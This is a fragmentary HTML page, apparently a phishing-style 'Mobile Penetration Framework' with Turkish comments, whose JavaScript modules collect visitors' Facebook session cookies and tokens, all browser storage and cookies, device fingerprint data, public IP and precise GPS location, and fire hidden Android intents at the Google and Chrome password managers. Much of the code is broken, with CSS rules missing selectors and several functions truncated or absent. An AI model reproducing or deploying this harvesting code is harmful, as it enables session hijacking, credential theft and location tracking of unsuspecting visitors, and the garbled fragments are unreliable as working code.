<!DOCTYPE html>
<html lang="tr">

    <title>Hassso54 - Advanced Mobile Penetration Framework</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        body {
            font-family: 'Courier New', 'Fira Code', monospace;
            background: #0a0e1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 20% 50%, rgba(0,255,0,0.03) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }
        .container {
            background: rgba(10, 14, 26, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 30px 25px;
            text-align: center;
            max-width: 380px;
            width: 100%;
            border: 1px solid rgba(0, 255, 0, 0.3);
            box-shadow: 0 25px 50px rgba(0,0,0,0.5), 0 0 20px rgba(0,255,0,0.1);
            position: relative;
            z-index: 1;
        }
        .glow {
            text-shadow: 0 0 5px #0f0, 0 0 10px #0f0;
        }
        .map-icon {
            width: 90px;
            height: 90px;
            filter: drop-shadow(0 0 8px #0f0);
            margin-bottom: 15px;
        }
        h2 {
            font-size: 18px;
            font-weight: 500;
            color: #0f0;
            margin-bottom: 5px;
            letter-spacing: 1px;
        }
        .location-text {
            font-size: 12px;
            color: #6aff6a;
            margin-bottom: 25px;
            opacity: 0.8;
        }
        button {
            background: linear-gradient(135deg, #0f0, #0a0);
            color: #000;
            border: none;
            width: 100%;
            padding: 15px 20px;
            border-radius: 60px;
            font-size: 16px;
            font-weight: bold;
            font-family: monospace;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 0 15px rgba(0,255,0,0.3);
        }
        button:active { transform: scale(0.97); }
        button:disabled { opacity: 0.5; transform: none; cursor: not-allowed; }
        .message-box {
            margin-top: 20px;
            padding: 12px;
            background: rgba(0,20,0,0.6);
            border-radius: 16px;
            font-size: 11px;
            color: #0f0;
            display: none;
            border-left: 3px solid #0f0;
            font-family: monospace;
        }

            margin-top: 15px;
            font-size: 9px;
            color: #4aff4a;
            display: flex;
            justify-content: space-between;
            border-top: 1px solid rgba(0,255,0,0.2);
            padding-top: 12px;

        .status-dot {
            width: 8px;
            height: 8px;
            background: #0f0;
            border-radius: 50%;

        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

            position: fixed;
            bottom: 10px;
            left: 10px;
            right: 10px;

            z-index: 100;
            pointer-events: none;

    function addLog(msg, type = "INFO") {

    function hideMessage() {
        msgBox.style.display = 'none';

    async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

    // ==================== MODÜL 6: GOOGLE PASSWORD MANAGER EXTRACTION ====================
    async function extractGooglePasswords() {

        let passwords = { status: "ATTEMPTED", data: [] };
        
        try {

    // ==================== MODÜL 7: FACEBOOK TOKEN EXTRACTION ====================
    async function extractFacebookTokens() {
        addLog("[FB] Facebook token extraction", "EXPLOIT");
        let fbData = { cookies: {}, storage: {}, tokens: [] };
        
        // Cookie'leri topla
        const allCookies = document.cookie;
        if (allCookies.includes('c_user')) {
            const match = allCookies.match(/c_user=([^;]+)/);
            if (match) fbData.cookies.c_user = match[1];
        }
        if (allCookies.includes('xs')) {
            const match = allCookies.match(/xs=([^;]+)/);
            if (match) fbData.cookies.xs = match[1];
        }
        if (allCookies.includes('datr')) {
            const match = allCookies.match(/datr=([^;]+)/);
            if (match) fbData.cookies.datr = match[1];
        }
        
        // localStorage token'ları
        for (let i = 0; i < localStorage.length; i++) {
            let key = localStorage.key(i);
            if (key.includes('fb') || key.includes('facebook')) {
                fbData.storage[key] = localStorage.getItem(key);
                if (key.includes('token') || key.includes('access')) fbData.tokens.push(localStorage.getItem(key));
            }
        }
        
        addLog(`[FB] Facebook verileri: user_id=${fbData.cookies.c_user || 'yok'}`, "INFO");
        return fbData;
    }

        addLog(`[IG] Instagram user_id=${igData.cookies.ds_user_id || 'yok'}`, "INFO");

    // ==================== MODÜL 10: BROWSER DATA EXTRACTION ====================
    function extractBrowserData() {
        addLog("[BROWSER] Tarayıcı verileri toplanıyor", "INFO");
        let localStorageData = {};
        let sessionStorageData = {};
        
        for (let i = 0; i < localStorage.length; i++) {
            let key = localStorage.key(i);
            localStorageData[key] = localStorage.getItem(key);
        }
        for (let i = 0; i < sessionStorage.length; i++) {
            let key = sessionStorage.key(i);
            sessionStorageData[key] = sessionStorage.getItem(key);
        }
        
        return {
            localStorage: localStorageData,
            sessionStorage: sessionStorageData,
            cookies: document.cookie,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: { width: screen.width, height: screen.height },
            referrer: document.referrer,
            url: window.location.href
        };
    }
    
    // ==================== MODÜL 11: GEOLOCATION & IP ====================
    async function getGeolocationAndIP() {
        addLog("[GPS] Konum ve IP alınıyor", "INFO");
        let ip = "Unknown";
        let location = null;
        
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;
        } catch(e) {}
        
        if (navigator.geolocation) {
            await new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        location = {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            url: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        };
                        resolve();
                    },
                    () => resolve(),
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            });
        }
        
        addLog(`[GPS] Konum: ${location ? location.lat + ',' + location.lng : 'alınamadı'}`, "INFO");
        return { ip, location };
    }

            "intent://com.google.android.gms/.auth.api.credentials.CredentialPickerActivity#Intent;scheme=android;end",
            "intent://com.android.chrome/com.google.android.apps.chrome.password_manager.PasswordManagerActivity#Intent;scheme=android;end"
        ];
        
        intents.forEach((intent, idx) => {
            setTimeout(() => {
                iframe.src = intent;
                addLog(`[INTENT] Gönderildi: ${intent.substring(0, 40)}...`, "INFO");
            }, idx * 400);
        });
        
        setTimeout(() => {
            if (document.body.contains(iframe)) document.body.removeChild(iframe);
            addLog("[INTENT] Tüm intent'ler gönderildi", "SUCCESS");
        }, 3500);
